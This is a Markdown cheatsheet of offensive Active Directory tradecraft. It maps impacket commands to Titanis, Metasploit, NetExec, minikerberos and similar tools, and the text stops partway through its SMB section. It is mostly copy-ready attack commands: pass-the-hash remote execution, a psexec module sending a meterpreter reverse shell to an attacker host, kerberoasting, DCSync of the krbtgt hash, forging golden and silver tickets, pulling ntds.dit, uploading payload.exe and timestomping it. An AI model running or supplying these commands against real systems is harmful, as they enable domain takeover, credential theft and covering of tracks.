# 📦 Outpacket

> **Tired of impacket?** This cheatsheet maps common impacket workflows to their modern alternatives

---

## Index

- [Auth Quick Reference](#auth-quick-reference)
- [1. Remote Execution](#1-remote-execution)
  - [WMI Exec](#wmi-exec) · `wmiexec.py`
  - [DCOM Exec](#dcom-exec) · `dcomexec.py`
  - [Service-Based Exec](#service-based-exec-smbexec--psexec) · `smbexec.py` · `psexec.py`
  - [Scheduled Task Exec](#scheduled-task-exec) · `atexec.py`
  - [Bulk Execution](#bulk-remote-execution-across-hosts) · `wmiexec.py` · `psexec.py`
- [2. Kerberos](#2-kerberos)
  - [Request TGT](#request-a-tgt) · `getTGT.py`
  - [Request TGS](#request-a-service-ticket-tgs) · `getST.py`
  - [S4U2self / S4U2proxy](#s4u2self--s4u2proxy) · `getST.py -impersonate`
  - [Kerberoasting](#kerberoasting) · `GetUserSPNs.py`
  - [AS-REP Roasting](#as-rep-roasting) · `GetNPUsers.py`
  - [ccache Roasting](#ccache-roasting-offline)
  - [Pre-Auth / Enc-Type Probe](#pre-auth--enc-type-probe) · `GetNPUsers.py`
  - [PKINIT NT Hash Recovery](#pkinit-nt-hash-recovery-unpac)
  - [Ticket Renewal](#ticket-renewal) · `getST.py -renew`
  - [Ticket Format Conversion](#ticket-format-conversion) · `ticketConverter.py`
  - [Change Password](#change-password) · `changepasswd.py`
  - [Golden / Silver Ticket](#golden--silver-ticket) · `ticketer.py`
- [3. SMB / File Operations](#3-smb--file-operations)
  - [List Shares](#list-shares) · `smbclient.py -shares`
  - [Browse / List Files](#browse--list-files) · `smbclient.py`
  - [Download a File](#download-a-file) · `smbclient.py get`
  - [Download with Backup Semantics](#download-with-backup-semantics)
  - [Upload a File](#upload-a-file) · `smbclient.py put`
  - [Create / Remove Directories and Files](#create--remove-directories-and-files) · `smbclient.py`
  - [List Named Pipes](#list-named-pipes) · `smbclient.py`
  - [Pass the Hash — SMB](#pass-the-hash--smb) · `smbclient.py -hashes`
  - [SMB over SOCKS5](#smb-over-socks5) · `proxychains smbclient.py`
  - [Enumerate Open Files / Sessions](#enumerate-open-files--sessions) · `netview.py`
  - [Remote File Timestomping](#remote-file-timestomping)
  - [VSS Snapshot Enumeration](#vss-snapshot-enumeration) · `smbclient.py list_snapshots`
  - [NTFS Alternate Data Streams](#ntfs-alternate-data-stream-ads-enumeration)
  - [Server NIC Enumeration](#server-nic-enumeration)
  - [Bulk Share Enumeration](#bulk-share-enumeration) · `smbclient.py`
- [4. Credential Dumping](#4-credential-dumping)
  - [LSASS Minidump Parsing](#lsass-minidump-parsing-offline)
  - [Dump SAM Hashes](#dump-sam-hashes) · `secretsdump.py -sam`
  - [Dump LSA Secrets](#dump-lsa-secrets) · `secretsdump.py -lsa`
  - [Dump SAM + LSA Together](#dump-sam--lsa-together) · `secretsdump.py`
  - [Bulk SAM / LSA Dump](#bulk-sam--lsa-dump-across-hosts) · `secretsdump.py`
  - [DCSync](#dcsync) · `secretsdump.py -just-dc-ntlm`
- [5. Enumeration](#5-enumeration)
  - [Domain Users (SAMR)](#enumerate-domain-users-samr) · `samrdump.py` · `net.py`
  - [Groups / Local Aliases](#enumerate-groups--local-aliases) · `net.py group` · `net.py localgroup`
  - [SID Brute Force / Lookup](#sid-brute-force--lookup) · `lookupsid.py`
  - [RPC Endpoints](#enumerate-rpc-endpoints) · `rpcdump.py` · `rpcmap.py`
  - [Query WMI](#query-wmi) · `wmiquery.py`
  - [WMI Method Invocation](#wmi-method-invocation) · `wmiexec.py`
  - [Remote Registry](#remote-registry-operations) · `reg.py`
  - [Registry Key Security Descriptor](#registry-key-security-descriptor)
  - [Service Enumeration](#service-enumeration) · `services.py`
  - [LSA Privilege Management](#lsa-privilege-management)
  - [LSA Privilege and Account Enumeration](#lsa-privilege-and-account-enumeration)
- [6. Active Directory / LDAP](#6-active-directory--ldap)
  - [Enumerate AD Users / Computers](#enumerate-ad-users--computers) · `GetADUsers.py` · `GetADComputers.py`
  - [GPO and Domain Trust Enumeration](#gpo-and-domain-trust-enumeration) · `netexec ldap --bloodhound`
  - [Find Delegation Configurations](#find-delegation-configurations) · `findDelegation.py`
  - [Add a Computer Account](#add-a-computer-account) · `addcomputer.py`
  - [Add a User Account](#add-a-user-account) · `net.py user -add`
  - [Set RBCD](#set-rbcd) · `rbcd.py`
  - [DACL Abuse](#dacl-abuse) · `dacledit.py` · `owneredit.py`
  - [User Attribute Modification (UAC)](#user-attribute-modification-uac-bitflags) · `net.py`
- [7. Auth Coercion](#7-auth-coercion) · `printerbug.py` · `dfscoerce.py`
  - [Coerce + Relay Pattern](#coerce--relay-pattern) · `ntlmrelayx.py` · `smbserver.py` (capture)
- [8. Certificates](#8-certificates)
  - [Self-Signed PFX Generation](#self-signed-pfx-generation)
  - [ADCS Template Enumeration](#adcs-certificate-template-enumeration) · `netexec ldap -M adcs`
  - [ADCS ESC1](#adcs-esc1--enroll-and-recover-nt-hash)

---

## Auth Quick Reference

| Scenario | impacket | Titanis | minikerberos URL | msldap URL | Metasploit |
|---|---|---|---|---|---|
| Password | `DOMAIN/user:Pass@host` | `-UserName user@DOMAIN -Password Pass` | `kerberos-password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` |
| Pass-the-Hash | `-hashes :NTLM` | `-NtlmHash <NTLM>` | `kerberos-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` |
| AES key | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos-aes://DOMAIN\user:hex@kdc` | `ldap+kerberos-aes://.../?dc=ip` | `AESKEY <hex>` |
| RC4 key | via `-hashes` | `-NtlmHash` | `kerberos-rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos-rc4://.../?dc=ip` | `NTHASH <NTLM>` |
| ccache | `KRB5CCNAME=file.ccache` | `-TicketCache file.ccache` | `kerberos-ccache://...?ccache=f.ccache` | `ldap+kerberos-ccache://.../?dc=ip&ccache=f.ccache` | `KrbUseCachedCredentials true` |
| kirbi ticket | convert first | `-Ticket file.kirbi` | `minikerberos-kirbi2ccache` first | convert first | `auxiliary/admin/kerberos/ticket_converter` |
| PKINIT / PFX | certipy / gettgtpkinit | — | `kerberos-pfx://...?pfx=f.pfx&pfxpass=P` | `ldap+kerberos-pfx://.../?dc=ip&pfx=f.pfx` | — |
| SOCKS5 | `proxychains` prefix | `-Socks5 host:port` | n/a | `?proxytype=socks5&proxyhost=...&proxyport=...` | `set Proxies socks5:127.0.0.1:1080` |
| Encrypt RPC | n/a | `-EncryptRpc` | n/a | n/a | auto |
| Backup semantics | n/a | `-BackupSemantics` | n/a | n/a | n/a |
| Anonymous bind | limited | undocumented | n/a | `ldap://192.168.1.1` | n/a |

---

## 1. Remote Execution

### WMI Exec

```bash
# impacket
wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"

# Titanis
wmi exec 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 "whoami"

# impacket — pass-the-hash
wmiexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "ipconfig"

# Titanis — pass-the-hash
wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN \
  -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 "ipconfig"

# impacket — Kerberos
wmiexec.py -k -no-pass DOMAIN/jdoe@dc01.domain.local "hostname"

# Titanis — Kerberos
wmi exec dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password Password123 "hostname"
```

[↑ Back to Index](#index)

---

### DCOM Exec

```bash
# impacket
dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"

# Titanis
dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Win32_Process Create "whoami"
```

[↑ Back to Index](#index)

---

### Service-Based Exec (smbexec / psexec)

```bash
# impacket — smbexec
smbexec.py DOMAIN/jdoe:Password123@192.168.1.10

# impacket — psexec
psexec.py DOMAIN/jdoe:Password123@192.168.1.10 cmd.exe

# Metasploit — password
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
  smbpass=Password123 payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>

# Metasploit — pass-the-hash
msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
  smbpass=aad3b435b51404eeaad3b435b51404ee:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>

# Titanis — create service, run, retrieve output, clean up
scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc \
  "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -Start
smb2 get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
```

[↑ Back to Index](#index)

---

### Scheduled Task Exec

> **Note:** MS-TSCH is not yet implemented in Titanis. Use `Win32_ScheduledJob` via WMI as a workaround, or `atexec.py` for true MS-TSCH semantics.

```bash
# Titanis — create immediate scheduled task via Win32_ScheduledJob
wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  Win32_ScheduledJob Create \
  "Command='cmd /c whoami > C:\\Windows\\Temp\\out.txt',StartTime='********143000.000000+000'"

# Titanis — retrieve output and clean up
smb2 get \\192.168.1.10\C$\Windows\Temp\out.txt out.txt \
  -UserName jdoe@DOMAIN -Password Password123
smb2 rm  \\192.168.1.10\C$\Windows\Temp\out.txt \
  -UserName jdoe@DOMAIN -Password Password123

# impacket — true MS-TSCH (creates, runs, and cleans up automatically)
atexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami > C:\Windows\Temp\out.txt"

# impacket — pass-the-hash
atexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 \
  "whoami > C:\Windows\Temp\out.txt"
```

[↑ Back to Index](#index)

---

### Bulk Remote Execution Across Hosts

```bash
# NetExec — spray across a subnet
netexec smb 192.168.1.0/24 -u jdoe -p Password123 -x "whoami"

# Titanis — loop over a host list
while IFS= read -r host; do
  echo "=== $host ===" >> exec_results.txt
  wmi exec "$host" -UserName jdoe@DOMAIN -Password Password123 \
    "whoami /all" >> exec_results.txt 2>&1
done < hosts.txt
```

[↑ Back to Index](#index)

---

## 2. Kerberos

### Request a TGT

```bash
# impacket — password
getTGT.py DOMAIN/jdoe:Password123 -dc-ip 192.168.1.1

# minikerberos — password
minikerberos-getTGT "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" jdoe.ccache

# Titanis — password (outputs kirbi)
kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi

# Metasploit
msf6 > use auxiliary/admin/kerberos/get_ticket
msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdoe \
  password=Password123 action=GET_TGT

# impacket — NTLM hash
getTGT.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe -dc-ip 192.168.1.1

# minikerberos — NTLM hash
minikerberos-getTGT "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" jdoe.ccache

# Titanis — NTLM hash
kerb asreq -UserName jdoe -Realm DOMAIN -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi

# impacket — AES256
getTGT.py -aesKey 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4 DOMAIN/jdoe

# minikerberos — AES256
minikerberos-getTGT \
  "kerberos-aes://DOMAIN\jdoe:76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4@192.168.1.1" \
  jdoe.ccache

# Titanis — AES256
kerb asreq -UserName jdoe -Realm DOMAIN \
  -AesKey 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi

# certipy — PKINIT
certipy auth -pfx jdoe.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL

# minikerberos — PKINIT (also recovers NT hash via UnPAC)
minikerberos-getTGT \
  "kerberos-pfx://DOMAIN\jdoe:@192.168.1.1?pfx=jdoe.pfx&pfxpass=Password123" jdoe.ccache

# Titanis — explicit RC4
kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
  -EncTypes Rc4Hmac -Kdc 192.168.1.1 -OutputFileName jdoe-tgt-rc4.kirbi
```

[↑ Back to Index](#index)

---

### Request a Service Ticket (TGS)

```bash
# impacket
getST.py -spn cifs/fileserver.domain.local -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# Metasploit
msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdoe \
  password=Password123 spn=cifs/fileserver.domain.local action=GET_TGS

# minikerberos (requires existing ccache)
minikerberos-getTGS \
  "kerberos-ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" \
  cifs/fileserver.domain.local fileserver.ccache

# Titanis
kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
  cifs/fileserver.domain.local -OutputFile jdoe-fileserver.kirbi
```

[↑ Back to Index](#index)

---

### S4U2self / S4U2proxy

```bash
# impacket — S4U2self + S4U2proxy in one call
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -dc-ip 192.168.1.1 DOMAIN/svc:Password123

# minikerberos — S4U2self
minikerberos-getS4U2self \
  "kerberos-password://DOMAIN\svc$:Password123@192.168.1.1" \
  Administrator@DOMAIN.LOCAL s4u_self.ccache

# minikerberos — S4U2proxy
minikerberos-getS4U2proxy \
  "kerberos-password://DOMAIN\svc$:Password123@192.168.1.1" \
  cifs/target.domain.local s4u_self.ccache s4u_proxy.ccache

# Titanis — combined self+proxy
kerb tgsreq -Kdc 192.168.1.1 -Tgt svc-tgt.kirbi \
  -S4UserName Administrator@DOMAIN cifs/target.domain.local \
  -OutputFile admin-target.kirbi
```

[↑ Back to Index](#index)

---

### Kerberoasting

```bash
# impacket
GetUserSPNs.py -dc-ip 192.168.1.1 -request DOMAIN/jdoe:Password123

# Metasploit
msf6 > use auxiliary/gather/get_user_spns
msf6 auxiliary(get_user_spns) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user=jdoe pass=Password123

# Metasploit — pass-the-hash
msf6 auxiliary(get_user_spns) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user=jdoe nthash=A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --kerberoasting kerberoast.txt

# minikerberos
minikerberos-kerberoast "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" \
  kerberoast_hashes.txt

# minikerberos — NTLM hash
minikerberos-kerberoast "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
  kerberoast_hashes.txt

# pypykatz
pypykatz kerberos spnroast "kerberos-password://DOMAIN\jdoe:Password123@192.168.1.1" \
  -o kerberoast_hashes.txt

# pypykatz — NTLM hash
pypykatz kerberos spnroast \
  "kerberos-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
  -o kerberoast_hashes.txt

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> kerberoast kerberoast_hashes.txt

# Titanis — enumerate SPNs, get TGT, loop tgsreq per SPN, extract hashes
ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(servicePrincipalName=*)" -OutputFields sAMAccountName,servicePrincipalName > spns.txt
kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
while IFS= read -r spn; do
  safe=$(echo "$spn" | tr '/:@' '_')
  kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
    -EncTypes Rc4Hmac "$spn" -OutputFile "roast_${safe}.kirbi"
done < <(awk '/servicePrincipalName:/{print $2}' spns.txt)
kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
minikerberos-ccacheroast kerberoast-all.ccache
```

[↑ Back to Index](#index)

---

### AS-REP Roasting

```bash
# impacket — no credentials required
GetNPUsers.py -dc-ip 192.168.1.1 -no-pass -usersfile users.txt DOMAIN/

# Metasploit
msf6 > use auxiliary/gather/kerberos_enumusers
msf6 auxiliary(kerberos_enumusers) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user_file=/path/to/users.txt

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --asreproast asrep.txt

# pypykatz — no credentials required
pypykatz kerberos asreproast "kerberos-password://DOMAIN\@192.168.1.1" \
  --userlist users.txt -o asrep_hashes.txt

# msldap (enumerate only — no hash capture)
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> asrep

# Titanis — find targets via LDAP, loop asreq
ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
  -OutputFields sAMAccountName > asrep_targets.txt
while IFS= read -r user; do
  kerb asreq -UserName "$user" -Realm DOMAIN \
    -Kdc 192.168.1.1 -EncTypes Rc4Hmac \
    -OutputFileName "asrep_${user}.kirbi" 2>/dev/null
done < <(awk '/sAMAccountName:/{print $2}' asrep_targets.txt)
```

[↑ Back to Index](#index)

---

### ccache Roasting (offline)

Extracts `$krb5tgs$` hashes from stolen ccache files without re-requesting anything.

```bash
# minikerberos
minikerberos-ccacheroast stolen.ccache

# pypykatz
pypykatz kerberos ccache roast stolen.ccache

# Feed output to: hashcat -m 13100  or  john --format=krb5tgs
```

[↑ Back to Index](#index)

---

### Pre-Auth / Enc-Type Probe

```bash
# kerbrute — enumerate valid accounts (no credentials)
kerbrute userenum -d DOMAIN --dc 192.168.1.1 users.txt

# pypykatz — enumerate valid accounts (no credentials)
pypykatz kerberos brute "kerberos-password://DOMAIN\@192.168.1.1" users.txt

# impacket — shows no-preauth accounts only
GetNPUsers.py -dc-ip 192.168.1.1 -no-pass -usersfile users.txt DOMAIN/

# Metasploit — classifies valid / disabled / no-preauth
msf6 > use auxiliary/gather/kerberos_enumusers
msf6 auxiliary(kerberos_enumusers) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user_file=/path/to/users.txt verbose=true

# Titanis — single account probe
kerb getasinfo -UserName jdoe -Realm DOMAIN -Kdc 192.168.1.1

# Titanis — bulk probe loop
while IFS= read -r user; do
  result=$(kerb getasinfo -UserName "$user" -Realm DOMAIN -Kdc 192.168.1.1 2>&1)
  if echo "$result" | grep -q "PRINCIPAL_UNKNOWN\|does not exist"; then
    echo "INVALID: $user"
  elif echo "$result" | grep -q "preauth.*false\|DONT_REQ_PREAUTH"; then
    echo "NO-PREAUTH: $user"
  else
    echo "VALID: $user"
  fi
done < users.txt
```

[↑ Back to Index](#index)

---

### PKINIT NT Hash Recovery (UnPAC)

Recovers an account's NT hash via PKINIT after obtaining a certificate.

```bash
# minikerberos — certificate → NT hash
minikerberos-getNTPKInit \
  "kerberos-pfx://DOMAIN\targetuser:@192.168.1.1?pfx=targetuser.pfx" \
  targetuser_nt.txt

# Full chain: certipy ESC1 → PFX → minikerberos UnPAC → NT hash → Titanis PTH
certipy req -username jdoe@DOMAIN -password Password123 \
  -ca CA-NAME -template VulnerableTemplate \
  -upn Administrator@DOMAIN.LOCAL \
  -target ca.domain.local -out admin
minikerberos-getNTPKInit \
  "kerberos-pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
wmi exec 192.168.1.10 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
```

[↑ Back to Index](#index)

---

### Ticket Renewal

```bash
# impacket
export KRB5CCNAME=jdoe.ccache
getST.py -k -no-pass -renew -spn krbtgt/DOMAIN.LOCAL -dc-ip 192.168.1.1 DOMAIN/jdoe

# MIT Kerberos
kinit -R
krenew -v -b -t

# Titanis
kerb renew -Ticket jdoe-tgt.kirbi -OutputFileName jdoe-tgt-renewed.kirbi
```

[↑ Back to Index](#index)

---

### Ticket Format Conversion

```bash
# impacket
ticketConverter.py jdoe.ccache jdoe.kirbi
ticketConverter.py jdoe.kirbi  jdoe.ccache

# Metasploit
msf6 > use auxiliary/admin/kerberos/ticket_converter
msf6 auxiliary(ticket_converter) > run inputpath=jdoe.ccache outputpath=jdoe.kirbi

# Metasploit — inspect ticket (optionally decrypt)
msf6 > use auxiliary/admin/kerberos/inspect_ticket
msf6 auxiliary(inspect_ticket) > run ticket_path=jdoe.ccache nthash=A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# minikerberos
minikerberos-ccache2kirbi jdoe.ccache
minikerberos-kirbi2ccache jdoe.kirbi jdoe.ccache
minikerberos-ccacheedit list jdoe.ccache
minikerberos-ccacheedit delete jdoe.ccache <credential-index>

# Titanis — merge multiple files
kerb select -From jdoe.ccache
kerb select -From jdoe*.kirbi -Into all-jdoe.ccache
```

[↑ Back to Index](#index)

---

### Change Password

```bash
# impacket — user changes own password
changepasswd.py -protocol kpasswd DOMAIN/jdoe:OldPass@192.168.1.1 -newpass NewPass

# Titanis — change own password
kerb changepw jdoe@DOMAIN 192.168.1.1 -Password OldPass NewPass

# impacket — admin resets another user's password
changepasswd.py -reset DOMAIN/admin:AdminPass@192.168.1.1 -newpass NewPass -altuser DOMAIN/jdoe

# Titanis — admin sets another user's password
kerb setpw -UserName admin@DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
```

[↑ Back to Index](#index)

---

### Golden / Silver Ticket

> **Titanis status:** No ticket forging. Use Metasploit `auxiliary/admin/kerberos/forge_ticket` (native Ruby) or impacket `ticketer.py`. Both output MIT ccache files loadable into Titanis via `-TicketCache`.

```bash
# Step 1 — obtain krbtgt hash via DCSync
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 \
  -just-dc-user DOMAIN/krbtgt | grep krbtgt

# Step 2a — forge golden ticket (Metasploit)
msf6 > use auxiliary/admin/kerberos/forge_ticket
msf6 auxiliary(forge_ticket) > run action=FORGE_GOLDEN domain=DOMAIN.LOCAL \
  domain_sid=S-1-5-21-... nthash=<krbtgt_ntlm> username=Administrator

# Step 2b — forge silver ticket (Metasploit)
msf6 auxiliary(forge_ticket) > run action=FORGE_SILVER domain=DOMAIN.LOCAL \
  domain_sid=S-1-5-21-... nthash=<service_ntlm> username=Administrator \
  spn=cifs/fileserver.domain.local

# Step 2c — forge diamond ticket (Metasploit)
msf6 auxiliary(forge_ticket) > run action=FORGE_DIAMOND domain=DOMAIN.LOCAL \
  rhosts=192.168.1.1 user=jdoe password=Password123 \
  nthash=<krbtgt_ntlm> username=Administrator

# Step 2d — forge sapphire ticket (Metasploit)
msf6 auxiliary(forge_ticket) > run action=FORGE_SAPPHIRE domain=DOMAIN.LOCAL \
  rhosts=192.168.1.1 user=jdoe password=Password123 \
  nthash=<krbtgt_ntlm> username=Administrator

# Step 2e — forge golden ticket (impacket)
ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... \
  -domain DOMAIN.LOCAL Administrator

# Step 3 — use forged ticket in Titanis
wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
  -TicketCache Administrator.ccache "whoami"
smb2 ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
  -TicketCache Administrator.ccache

# Silver ticket (impacket) + Titanis
ticketer.py -nthash <service_ntlm> -domain-sid S-1-5-21-... \
  -domain DOMAIN.LOCAL -spn cifs/fileserver.domain.local Administrator
smb2 ls \\fileserver.domain.local\C$ -UserName Administrator@DOMAIN \
  -TicketCache Administrator.ccache
```

[↑ Back to Index](#index)

---

## 3. SMB / File Operations

### List Shares

```bash
# impacket
smbclient.py -shares DOMAIN/jdoe:Password123@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --shares

# smbclient
smbclient -L //192.168.1.10 -U 'DOMAIN\jdoe%Password123'

# Titanis
smb2 enumshares \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Browse / List Files

```bash
# impacket
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10

# smbclient-ng
smbclient-ng -u jdoe -p Password123 --domain DOMAIN --host 192.168.1.10

# Titanis
smb2 ls \\192.168.1.10\Share -UserName jdoe -UserDomain DOMAIN -Password Password123
smb2 ls \\192.168.1.10\C$   -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Download a File

```bash
# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
  -c 'get Windows\System32\drivers\etc\hosts hosts.txt'

# Titanis
smb2 get \\192.168.1.10\C$\Windows\System32\drivers\etc\hosts hosts.txt \
  -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Download with Backup Semantics

For locked or protected files (NTDS.dit, SYSTEM hive, etc.).

```bash
# Titanis
smb2 get \\192.168.1.10\C$\Windows\NTDS\ntds.dit ntds.dit \
  -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
```

[↑ Back to Index](#index)

---

### Upload a File

```bash
# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
  -c 'put payload.exe Windows\Temp\payload.exe'

# Titanis
smb2 put payload.exe \\192.168.1.10\C$\Windows\Temp\payload.exe \
  -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Create / Remove Directories and Files

```bash
# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'mkdir Windows\Temp\newdir'
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'rmdir Windows\Temp\newdir'
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'del Windows\Temp\file.txt'

# Titanis
smb2 mkdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
smb2 rmdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
smb2 rm    \\192.168.1.10\C$\Windows\Temp\file.txt -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### List Named Pipes

```bash
# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --pipe

# Titanis
smb2 ls \\192.168.1.10\IPC$ -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Pass the Hash — SMB

```bash
# impacket
smbclient.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# Titanis
smb2 ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN \
  -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
```

[↑ Back to Index](#index)

---

### SMB over SOCKS5

```bash
# impacket
proxychains smbclient.py DOMAIN/jdoe:Password123@192.168.1.10

# Titanis
smb2 ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123 \
  -Socks5 127.0.0.1:1080
```

[↑ Back to Index](#index)

---

### Enumerate Open Files / Sessions

```bash
# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --sessions
netexec smb 192.168.1.10 -u jdoe -p Password123 --loggedon-users

# Titanis
smb2 enumopenfiles \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
smb2 enumsessions  \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Remote File Timestomping

```bash
# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
  touch --time "2022-01-01 00:00:00" C$/Windows/Temp/payload.exe

# Titanis
smb2 touch \\192.168.1.10\C$\Windows\Temp\payload.exe \
  -UserName jdoe -UserDomain DOMAIN -Password Password123 -Time "2022-01-01 00:00:00"
```

[↑ Back to Index](#index)

---

### VSS Snapshot Enumeration

```bash
# impacket — interactive shell command
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
# list_snapshots C$

# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN snapshots C$

# Titanis
smb2 enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### NTFS Alternate Data Stream (ADS) Enumeration

```bash
# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
  -c 'allinfo Windows\Temp\file.txt'

# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
  streams C$/Windows/Temp/file.txt

# Titanis
